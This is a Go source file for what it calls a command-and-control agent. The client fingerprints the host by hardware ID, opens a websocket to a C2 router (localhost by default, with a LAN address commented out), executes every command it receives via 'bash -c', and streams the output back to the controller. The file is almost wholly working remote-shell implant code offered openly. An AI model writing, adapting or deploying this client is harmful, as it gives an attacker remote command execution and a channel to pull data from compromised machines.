package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"github.com/denisbrodbeck/machineid"
	"github.com/gorilla/websocket"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"time"
)

func init() {
	//addr = flag.String("addr", os.Getenv("SERVER_HOSTNAME")+":8081", "http service address")
	addr = flag.String("addr", "localhost:8081", "http service address")
	//addr = flag.String("addr", "192.168.50.19:8081", "http service address")
}

var (
	addr    *string
	newline = []byte{'\n'}
	space   = []byte{' '}
)

type Client struct {
	ws   *websocket.Conn
	send chan []byte
}

func connectToC2Router() {
	flag.Parse()
	log.SetFlags(0)

	interrupt := make(chan os.Signal, 1)
	signal.Notify(interrupt, os.Interrupt)

	machineHWID, err := machineid.ID()
	if err != nil {
		log.Fatal(err)
	}

	targetUrlPath := fmt.Sprintf("/ws/%s", machineHWID) // use discord id as clientId
	targetUrl := url.URL{Scheme: "ws", Host: *addr, Path: targetUrlPath}
	log.Printf("connecting to %s", targetUrl.String())

	header := http.Header{}
	header.Set("origin", "ws://localhost:8082")

	c, _, err := websocket.DefaultDialer.Dial(targetUrl.String(), header)
	client := &Client{ws: c, send: make(chan []byte)}
	if err != nil {
		log.Fatal("dial:", err)
	}
	log.Println("connected to C2")

	go client.readPump()
	go client.writePump()
}

//func Shellout(command string) (string, string, error) {
//	var stdout bytes.Buffer
//	var stderr bytes.Buffer
//	cmd := exec.Command(ShellToUse, "-c", command)
//	cmd.Stdout = &stdout
//	cmd.Stderr = &stderr
//	err := cmd.Run()
//	return stdout.String(), stderr.String(), err
//}
//

func executeCommand(command string, c *Client) {
	cmd := exec.Command("bash", "-c", command) // '-b' option for non-interactive mode
	cmdReader, err := cmd.StdoutPipe()
	if err != nil {
		log.Fatalf("Error creating StdoutPipe for Cmd: %v", err)
	}
	//cmdError, err := cmd.StderrPipe()
	//if err != nil {
	//	log.Fatalf("Error creating StderrPipe for Cmd: %v", err)
	//}

	cmd.Start()
	scanner := bufio.NewScanner(cmdReader)

	go func() {
		timer := time.NewTimer(5 * time.Second)
		defer func() {
			if !timer.Stop() {
				<-timer.C // Ensure the timer's channel is drained
			}
		}()

		for {
			select {
			case <-timer.C: // When timer expires
				log.Println("Command execution timed out")
				return

			default:
				// Continue to process output if available
				if scanner.Scan() {
					commandOutput := scanner.Text() + "\n"

					log.Println(commandOutput)
					transferPacket := encodeTransferPacket("command_output", commandOutput)
					c.send <- transferPacket
				} else {
					// If scanner.Scan() returns false, it might mean EOF or an error.
					if err := scanner.Err(); err != nil {
						log.Printf("Error reading command output: %v", err)
					}
					err := cmd.Wait()
					if err != nil {
						log.Println("cmdwait err: ", err)
						return
					} // Wait for the command to finish
					return // Exit the goroutine
				}
			}
		}
	}()
}

func (c *Client) readPump() {
	defer c.ws.Close()

	for {
		_, message, err := c.ws.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				log.Printf("error: %v", err)
			}
			break
		}
		log.Printf("recv: %s", message)

		transferPacket := TransferPacket{}
		err = json.Unmarshal(message, &transferPacket)
		if err != nil {
			log.Println("unmarshal transferPacket command:", err)
		}

		if transferPacket.Header == "command" {
			command := transferPacket.Payload
			executeCommand(command, c)
		}

	}
}

func (c *Client) writePump() {
	defer func() {
		c.ws.Close()
	}()
	for {
		select {
		case message, _ := <-c.send:
			w, err := c.ws.NextWriter(websocket.TextMessage)
			if err != nil {
				return
			}
			w.Write(message)

			// Add queued chat messages to the current websocket message.
			n := len(c.send)
			for i := 0; i < n; i++ {
				w.Write(newline)
				w.Write(<-c.send)
			}

			if err := w.Close(); err != nil {
				return
			}
		}
	}
}

func main() {
	stop := make(chan os.Signal, 1)
	signal.Notify(stop, os.Interrupt)

	connectToC2Router()

	<-stop
}
